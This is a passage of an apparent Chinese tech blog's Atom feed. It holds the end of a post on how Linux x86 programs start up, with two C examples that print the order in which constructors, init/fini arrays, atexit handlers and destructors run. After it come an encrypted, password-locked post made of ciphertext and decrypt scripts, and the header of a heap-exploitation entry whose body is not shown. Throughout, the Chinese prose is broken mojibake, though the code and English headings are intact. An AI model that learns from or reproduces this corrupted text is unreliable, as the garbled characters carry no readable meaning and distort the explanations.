end</h2><p>ÂΩì<code>__libc_csu_init</code>ÂáΩÊï∞ËøêË°åÁªìÊùüÂêéÔºåÂ∞±ËøîÂõû‰∫Ü<code>__libc_start_main</code>„ÄÇ</p><p>Ëøô‰∏™ÂáΩÊï∞Ë∞ÉÁî®‰∫ÜÊàë‰ª¨ÁöÑmainÂáΩÊï∞ÔºåÁÑ∂ÂêéÂ∞ÜmainÂáΩÊï∞ÁöÑËøîÂõûÂÄº‰º†ÈÄíÁªô‰∫ÜexitÂáΩÊï∞„ÄÇ</p><p>ÊúÄÂêéexitÂáΩÊï∞ËøêË°åÊåâÁÖßÊ≥®ÂÜåÈ°∫Â∫è‰æùÊ¨°ËøêË°å‰∫ÜÂú®at_exit()‰∏≠Ê≥®ÂÜåÁöÑÂáΩÊï∞„ÄÇ</p><p>ÁÑ∂Âêé‰ºöËøêË°åÂè¶Â§ñ‰∏Ä‰∏™Âæ™ÁéØÔºåËøôÊ¨°ÁöÑÂæ™ÁéØÊòØÂú®<code>__fini_</code>Êï∞ÁªÑ‰∏≠ÂÆö‰πâÁöÑ„ÄÇÂú®ËøêË°åÂÆåËøô‰∫õÂáΩÊï∞‰πãÂêéÔºåÂ∞±‰ºöË∞ÉÁî®ÊûêÊûÑÂáΩÊï∞„ÄÇ</p><h2 id="0x10-Summary"><a href="#0x10-Summary" class="headerlink" title="0x10 Summary"></a>0x10 Summary</h2><p><img src="/2021/06/02/Linux-x86-Program/callgraph.png" alt="image of the callgraph for all the routines involved in program startup on linux"></p><p>‰∏äÈù¢Ëøô‰∏™ÂõæÁâá‰πüËÆ©Êàë‰ª¨ÁêÜÊ∏Ö‰∫ÜÊÄùË∑Ø</p><ol><li>È¶ñÂÖàËøõÂÖ•<code>_start</code>ÔºåÁÑ∂ÂêéËøõÂÖ•<code>__libc_start_mian</code>„ÄÇ</li><li>Âú®<code>__libc_start_main</code>‰∏≠ÔºåÂàÜÊàê‰∫Ü‰∏âÈÉ®ÂàÜ<code>__libc_csu_init</code> <code>main</code>Âíå<code>exit</code></li><li>ÊúÄÂÖàËøõË°åÁöÑÂΩìÁÑ∂Â∞±ÊòØ<code>__libc_csu_init</code>‰∏≠ÁöÑ<code>_init</code>Ôºå‰∏ªË¶ÅÊòØËøõË°åÂú∞ÂùÄÊó†ÂÖ≥ÂåñÔºåÊòØÂê¶ËæìÂá∫gmon.outÂíåÊòØÂê¶Ë∞ÉÁî®<code>__register_fram_info</code>ÔºåËøòÊúâÊúÄÈáçË¶ÅÁöÑÊûÑÈÄ†ÂáΩÊï∞„ÄÇ‰πüÂ∞±ÊòØÊàë‰ª¨ËØ¥ÁöÑ<code>__attribute__ ((constructor)) constructor()</code>„ÄÇ</li><li>Âú®ÊâßË°åÂÆåËøô‰∏™‰πãÂêéÂë¢ÔºåÂ∞±‰ºöÈÄÄÂõûÂà∞<code>__libc_csu_init</code>‰∏≠ÔºåÁúãÂÖ∂‰∏≠ÁöÑÊï∞ÁªÑ‰∏≠Êàë‰ª¨Ëá™ÂÆö‰πâÁöÑÂáΩÊï∞ÔºåÁÑ∂ÂêéËøêË°å„ÄÇ</li><li>‰πãÂêéÂë¢Â∞±ËøõÂÖ•Êàë‰ª¨ÁÜüÁü•ÁöÑ‰∏ªÂáΩÊï∞ÔºåÊâßË°å‰∏ªÂáΩÊï∞ÁöÑÂÜÖÂÆπ„ÄÇ</li><li>ÊúÄÂêéÂ∞±ÊòØÊâßË°å<code>exit</code>ÔºåÂΩìÁÑ∂ËøôÈáåÈù¢Êúâ<code>at_exit</code>ÂíåÊàë‰ª¨Ëá™ÂÆö‰πâÂÜôÁöÑÂáΩÊï∞Ôºå‰ª•ÂèäÊûêÊûÑÂáΩÊï∞</li></ol><p>ÊúÄÂêéÔºåÊàë‰ª¨Êù•Áúã‰∏§‰∏™‰æãÂ≠ê</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hook.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">preinit</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span> </span>&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, __FUNCTION__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span> </span>&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, __FUNCTION__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fini</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, __FUNCTION__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((section(<span class="string">".init_array"</span>))) typeof(init) *__init = init;</span><br><span class="line">__attribute__((section(<span class="string">".preinit_array"</span>))) typeof(preinit) *__preinit = preinit;</span><br><span class="line">__attribute__((section(<span class="string">".fini_array"</span>))) typeof(fini) *__fini = fini;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>  __attribute__ ((constructor)) constructor() &#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, __FUNCTION__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __attribute__ ((destructor)) destructor() &#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, __FUNCTION__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">my_atexit</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, __FUNCTION__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">my_atexit2</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, __FUNCTION__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> atexit(my_atexit);</span><br><span class="line"> atexit(my_atexit2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">preinit</span></span><br><span class="line"><span class="comment">init</span></span><br><span class="line"><span class="comment">constructor</span></span><br><span class="line"><span class="comment">my_atexit2</span></span><br><span class="line"><span class="comment">my_atexit</span></span><br><span class="line"><span class="comment">destructor</span></span><br><span class="line"><span class="comment">fini</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//hook.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>  __attribute__ ((constructor)) constructor() &#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, __FUNCTION__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __attribute__ ((destructor)) destructor() &#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, __FUNCTION__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">my_atexit</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, __FUNCTION__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">my_atexit2</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, __FUNCTION__);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">preinit</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span> </span>&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, __FUNCTION__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span> </span>&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, __FUNCTION__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fini</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, __FUNCTION__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((section(<span class="string">".init_array"</span>))) typeof(init) *__init = init;</span><br><span class="line">__attribute__((section(<span class="string">".preinit_array"</span>))) typeof(preinit) *__preinit = preinit;</span><br><span class="line">__attribute__((section(<span class="string">".fini_array"</span>))) typeof(fini) *__fini = fini;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> atexit(my_atexit);</span><br><span class="line"> atexit(my_atexit2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">preinit</span></span><br><span class="line"><span class="comment">constructor</span></span><br><span class="line"><span class="comment">init</span></span><br><span class="line"><span class="comment">my_atexit2</span></span><br><span class="line"><span class="comment">my_atexit</span></span><br><span class="line"><span class="comment">fini</span></span><br><span class="line"><span class="comment">destructor</span></span><br><span class="line"><span class="comment">**/</span></span><br></pre></td></tr></table></figure><p>Ë∞ÉËØïÂêéÂèëÁé∞<code>constructor</code>Âíå<code>init</code>ÊòØÂú®‰∏Ä‰∏™ÊÆµÂÜÖÔºåÊâÄ‰ª•Â∞±ÊòØË∞ÅÂÖàÂÆö‰πâÊâßË°åË∞Å„ÄÇ</p><p><img src="/2021/06/02/Linux-x86-Program/%7BIZ%5DTML%7DSRD22%5BD8DB%7BO_KQ.png" alt="img"></p><h1 id="ÂèÇËÄÉ"><a href="#ÂèÇËÄÉ" class="headerlink" title="ÂèÇËÄÉ"></a>ÂèÇËÄÉ</h1><p><a href="http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html" target="_blank" rel="noopener">Linux x86 Program Start Up (dbp-consulting.com)</a></p><p><a href="https://blog.csdn.net/luomuxiaoxiao98/article/details/84955700" target="_blank" rel="noopener">Linux X86 Á®ãÂ∫èÂêØÂä® ‚Äì mainÂáΩÊï∞ÊòØÂ¶Ç‰ΩïË¢´ÊâßË°åÁöÑÔºü_luomuxiaoxiao98ÁöÑ‰∏ìÊ†è-CSDNÂçöÂÆ¢</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Linux-x86-Program-Start-Up&quot;&gt;&lt;a href=&quot;#Linux-x86-Program-Start-Up&quot; class=&quot;headerlink&quot; title=&quot;Linux x86 Program Start Up&quot;&gt;&lt;/a&gt;Linux x86 Program Start Up&lt;/h1&gt;&lt;p&gt;Êàë‰ª¨Âè™ÂÖ≥Ê≥®x86ÁöÑÁ®ãÂ∫è&lt;/p&gt;</summary>
    
    
    
    
    <category term="Linux" scheme="https://pz1o.top/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Èù¢ËØï</title>
    <link href="https://pz1o.top/2021/06/02/%E9%9D%A2%E8%AF%95/"/>
    <id>https://pz1o.top/2021/06/02/%E9%9D%A2%E8%AF%95/</id>
    <published>2021-06-02T08:36:10.000Z</published>
    <updated>2021-06-02T14:04:24.239Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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 </div>]]></content>
    
    
    <summary type="html">The article has been encrypted, please enter your password to view.&lt;br&gt;</summary>
    
    
    
    
    <category term="others" scheme="https://pz1o.top/tags/others/"/>
    
  </entry>
  
  <entry>
    <title>how2heap</title>
    <link href="https://pz1o.top/2021/05/19/how2heap/"/>
    <id>https://pz1o.top/2021/05/19/how2heap/</id>
    <published>2021-05-19T15:13:31.000Z</published>
    <updated>2021-06-09T11:45:40.849Z</updated>
    
